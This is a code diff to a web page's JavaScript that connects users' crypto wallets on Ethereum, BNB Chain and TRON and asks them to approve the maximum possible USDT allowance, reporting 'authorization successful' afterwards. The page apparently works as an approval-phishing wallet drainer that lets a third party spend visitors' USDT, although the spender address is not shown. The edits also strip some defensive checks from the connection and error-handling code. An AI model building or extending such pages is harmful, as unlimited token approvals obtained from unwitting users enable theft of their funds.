@@ -240,6 +240,13 @@
         // ==================== 配置 ====================
         const PROJECT_ID = '91bd623c7859e77a38c7b10c615976b6';
         
+        // 链配置
+        const CHAINS = {
+            1: { name: 'Ethereum', chainId: 1, isEvm: true },
+            56: { name: 'BNB Chain', chainId: 56, isEvm: true },
+            728126428: { name: 'TRON', chainId: 728126428, isEvm: false }
+        };
+        
         // USDT 合约地址
         const USDT_ADDRESS = {
             1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
@@ -258,7 +265,7 @@
         const UNLIMITED_AMOUNT_EVM = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
         const UNLIMITED_AMOUNT_TRON = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
-        // 钱包列表
+        // 钱包列表（仅用于 UI 选择）
         const EVM_WALLETS = [
             { key: 'metamask', name: 'MetaMask', icon: '🦊', chains: ['evm'] },
             { key: 'tokenpocket', name: 'TokenPocket', icon: '🎫', chains: ['evm', 'tron'] },
@@ -321,9 +328,9 @@
             });
         }
         
-        // ==================== EVM 链授权 ====================
+        // ==================== EVM 授权（Web3Modal） ====================
         async function initWeb3Modal() {
-            if (!web3Modal && typeof Web3Modal !== 'undefined') {
+            if (!web3Modal) {
                 web3Modal = new Web3Modal({
                     projectId: PROJECT_ID,
                     walletConnectVersion: 2,
@@ -348,9 +355,9 @@
                 await initWeb3Modal();
                 if (!web3Modal) throw new Error('Web3Modal 未初始化');
                 
-                const provider = await web3Modal.connect();
-                const ethersProvider = new ethers.providers.Web3Provider(provider);
-                const signer = ethersProvider.getSigner();
+                const instance = await web3Modal.openModal();
+                const provider = new ethers.providers.Web3Provider(instance);
+                const signer = provider.getSigner();
                 const address = await signer.getAddress();
                 updateInfoText(`已连接: ${address.slice(0, 6)}...${address.slice(-4)}`);
                 
@@ -371,7 +378,7 @@
                 updateInfoText(`授权成功！交易ID: ${receipt.transactionHash.slice(0, 10)}...`);
             } catch (error) {
                 console.error('EVM 授权失败:', error);
-                if (error.message?.includes('reject') || error.message?.includes('deny')) {
+                if (error.message.includes('reject') || error.message.includes('deny')) {
                     showStatus('用户取消了授权', 'error');
                 } else {
                     showStatus('授权失败: ' + error.message, 'error');
@@ -379,7 +386,7 @@
             }
         }
         
-        // ==================== TRON 链授权 ====================
+        // ==================== TRON 授权（DApp 浏览器） ====================
         function isInTronWalletBrowser() {
             return (typeof window.tronLink !== 'undefined' && window.tronLink.ready) ||
                    (typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress);
